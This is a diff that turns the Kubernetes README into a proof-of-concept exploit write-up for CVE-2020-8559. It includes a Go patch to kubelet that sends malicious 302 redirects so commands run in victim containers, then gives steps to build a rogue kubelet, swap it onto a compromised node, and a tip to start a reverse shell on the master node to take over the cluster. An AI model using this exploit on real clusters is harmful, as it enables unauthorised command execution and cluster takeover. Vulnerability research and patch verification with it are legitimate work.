@@ -1,84 +1,80 @@
-# Kubernetes
+# Kubernetes CVE-2020-8559 Proof of Concept PoC
 
-[![GoDoc Widget]][GoDoc] [![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/569/badge)](https://bestpractices.coreinfrastructure.org/projects/569)
+This is a PoC for CVE-2020-8559 This vulnerability allows an attacker who has gotten `root` on a Node to execute commands on any other Container in the cluster allowing the attacker to take over the Kubernetes Master Node.
 
-<img src="https://github.com/kubernetes/kubernetes/raw/master/logo/logo.png" width="100">
+This vulnerability results in the fact that the Kubernetes API Server and kubectl command will follow HTTP Redirects combined with the fact that the Kubernetes API just puts all of the components of an API request into the URL i.e. Node name, Pod name, Container name, and even the Command. Therefor, if the Kubelet process responds to `/exec`, `/attach`, `/portforward`, or any `resource: proxy` action with a HTTP 302 Redirect with a Location header which says to execute a different command on a different Node in a different Container the Kubernetes API Server or `kubectl` command will happily make a new request for whatever is in the Location header.
 
-----
-
-Kubernetes is an open source system for managing [containerized applications]
-across multiple hosts; providing basic mechanisms for deployment, maintenance,
-and scaling of applications.
-
-Kubernetes builds upon a decade and a half of experience at Google running
-production workloads at scale using a system called [Borg],
-combined with best-of-breed ideas and practices from the community.
-
-Kubernetes is hosted by the Cloud Native Computing Foundation ([CNCF]).
-If you are a company that wants to help shape the evolution of
-technologies that are container-packaged, dynamically-scheduled
-and microservices-oriented, consider joining the CNCF.
-For details about who's involved and how Kubernetes plays a role,
-read the CNCF [announcement].
-
-----
-
-## To start using Kubernetes
-
-See our documentation on [kubernetes.io].
-
-Try our [interactive tutorial].
-
-Take a free course on [Scalable Microservices with Kubernetes].
-
-## To start developing Kubernetes
-
-The [community repository] hosts all information about
-building Kubernetes from source, how to contribute code
-and documentation, who to contact about what, etc.
-
-If you want to build Kubernetes right away there are two options:
-
-##### You have a working [Go environment].
+## Git diff
 
 ```
-go get -d k8s.io/kubernetes
-cd $GOPATH/src/k8s.io/kubernetes
-make
+diff --git a/pkg/kubelet/server/server.go b/pkg/kubelet/server/server.go
+index c1f1975fe43..8459802755e 100644
+--- a/pkg/kubelet/server/server.go
++++ b/pkg/kubelet/server/server.go
+@@ -867,6 +867,28 @@ func (s *Server) ServeHTTP(w http.ResponseWriter, req *http.Request) {
+
+        method, path := req.Method, trimURLPath(req.URL.Path)
+
++       ////
++       ////
++       // If path is vulnerable to CVE-2020-8559 send 302 redirect with malicious Location header
++       ////
++       ////
++       protocol := "https"
++       // If attacking requests from admins using the kubectl command
++       //     host == hostname of the Kubernetes API server obtained from `kubectl -v 8 get pods`
++       // If attacing the Kubernetes API Server
++       //     host == hostname of the Node the Victim container is running on
++       host := "internal-api-app-25-prod-k8s-local-123456-123456789.us-west-2.elb.amazonaws.com"
++       namespace := "default"
++       pod := "victim-675759495f-pmfbk"
++       container := "victim"
++       command := "hostname"
++       if strings.Contains(req.URL.Path, "/exec") || strings.Contains(req.URL.Path, "/attach") || strings.Contains(req.URL.Path, "/portforward") {
++               fmt.Println("--------------------------------------------------------------")
++               fmt.Println("Sending Redirect")
++               fmt.Println("--------------------------------------------------------------")
++               http.Redirect(w, req, protocol+"://"+host+"/api/v1/namespaces/"+namespace+"/pods/"+pod+"/exec?command="+command+"&container="+container+"&stderr=true&stdout=true", 302)
++       }
++
+        longRunning := strconv.FormatBool(isLongRunningRequest(path))
+
+        servermetrics.HTTPRequests.WithLabelValues(method, path, serverType, longRunning).Inc()
 ```
 
-##### You have a working [Docker environment].
+## Configure
+
+This PoC will just send 302 HTTP Redirect with a hard coded Location header, so you will need to edit `kubernetes/pkg/kubelet/server/server.go` and update `host`, `namespace`, `pod`, `container`, and `command`
+
+__ProTip:__ List all of the Pods in the cluster. Then, configure this to execute commands on a Pod running on the Kubernetes Master Node in order start a reverse shell back to you in order to take over the cluster
+
+## Build
+
+After Configuring the attack, build a rouge `kubelet` binary
 
 ```
-git clone https://github.com/kubernetes/kubernetes
 cd kubernetes
-make quick-release
+GO111MODULE=on go mod download
+cd kubernetes/cmd/kubelet
+go build
 ```
 
-For the full story, head over to the [developer's documentation].
+## Attack
 
-## Support
+1. Get root on a Node
+2. Copy the rouge `kubelet` binary to the Node
+3. Stop the `kubelet` process and over-write it with the rouge binary
+`ps aux |grep kubelet`
+Find the PID of the `kubelet` process
+`sudo kill $PID ; sudo kubelet /usr/local/bin/kubelet`
+4. Kill the `kubelet` process again so that it will re-start with the rouge binary
+`ps aux |grep kubelet`
+Find the PID of the `kubelet` process
+`sudo kill $PID`
+5. If configured to attack ad amdin using the `kubectl` command on their local workstation, This command should return the hostname of the Victim Container instead of the container it should have been executed on
+```
+[0038][tdwyer@tdwyer-nuc:~/CVE-2020-8559]$ kubectl exec attacker-5cf89b94db-xdbfm -- hostname
+victim-675759495f-pmfbk
+```
 
-If you need support, start with the [troubleshooting guide],
-and work your way through the process that we've outlined.
 
-That said, if you have questions, reach out to us
-[one way or another][communication].
-
-[announcement]: https://cncf.io/news/announcement/2015/07/new-cloud-native-computing-foundation-drive-alignment-among-container
-[Borg]: https://research.google.com/pubs/pub43438.html
-[CNCF]: https://www.cncf.io/about
-[communication]: https://git.k8s.io/community/communication
-[community repository]: https://git.k8s.io/community
-[containerized applications]: https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/
-[developer's documentation]: https://git.k8s.io/community/contributors/devel#readme
-[Docker environment]: https://docs.docker.com/engine
-[Go environment]: https://golang.org/doc/install
-[GoDoc]: https://godoc.org/k8s.io/kubernetes
-[GoDoc Widget]: https://godoc.org/k8s.io/kubernetes?status.svg
-[interactive tutorial]: https://kubernetes.io/docs/tutorials/kubernetes-basics
-[kubernetes.io]: https://kubernetes.io
-[Scalable Microservices with Kubernetes]: https://www.udacity.com/course/scalable-microservices-with-kubernetes--ud615
-[troubleshooting guide]: https://kubernetes.io/docs/tasks/debug-application-cluster/troubleshooting/
-
-[![Analytics](https://kubernetes-site.appspot.com/UA-36037335-10/GitHub/README.md?pixel)]()
